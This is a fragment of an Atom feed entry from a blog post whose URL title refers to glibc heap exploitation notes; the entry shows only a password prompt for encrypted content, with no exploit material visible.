    <id>https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2023-11-12T16:00:00.000Z</published>
    <updated>2024-05-24T06:47:19.809Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a9f55d7acbad39bc74c8cf711acc0b79966b29d0abeca15e18864f6a052d705e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
</feed>
